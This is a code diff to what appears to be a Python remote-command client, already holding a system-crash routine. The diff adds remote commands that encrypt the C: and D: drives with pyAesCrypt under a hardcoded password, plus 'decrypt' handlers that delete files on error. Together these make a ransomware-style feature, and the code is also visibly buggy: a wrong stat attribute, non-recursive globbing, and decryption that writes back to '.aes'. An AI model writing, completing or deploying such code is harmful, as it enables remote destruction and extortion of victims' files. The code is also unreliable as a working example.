@@ -7,6 +7,11 @@ import time
 import threading
 import rsa
 import getpass
+import glob
+import pyAesCrypt
+from os import stat, remove
+global PASSWORD
+PASSWORD = 'Sqdw=h~4ea;9mgj`KY{@>$fXGB,%'
 
 try:
     os.mkdir('menus')
@@ -60,7 +65,14 @@ def handle_command(command, c):
         menus(c)
     elif command == '-crashsys':
         crash()
-        
+    elif command == '-s encrypt C:':
+        crypt('C:')
+    elif command == '-s decrypt D:':
+        crypt('D:')
+    elif command == '-decrypt C:':
+        decrypt('C:')
+    elif command == '-decrypt D:':
+        decrypt('D:')
     else:
         command_response = None
         
@@ -110,7 +122,26 @@ def crash():
         os.startfile('msedge')
         os.startfile('cmd')
             
+def crypt(dir):
+    ## Encrypt the files in directory
+    for file in glob.glob(dir):
+        with open(file, 'rb') as fIn:
+            with open(f'{file}.aes', 'wb') as fOut:
+                pyAesCrypt.encryptStream(fIn, fOut, PASSWORD)
         
+    # Get encrypted file size
+        encfilesize = os.stat(file).ST_SIZE
+
+def decrypt(dir):
+    ## Decrypt the files in directory
+    for file in glob.glob(dir):
+        with open(file, 'rb') as fIn:
+            try:
+                with open(f'{file}.aes', 'wb') as fOut:
+                # Decrypt the stream
+                    pyAesCrypt.decryptStream(fIn, fOut, PASSWORD)
+            except ValueError:
+                remove(file)
 
 
 ##################################################################################### Currently Fixing #########################################################################################   
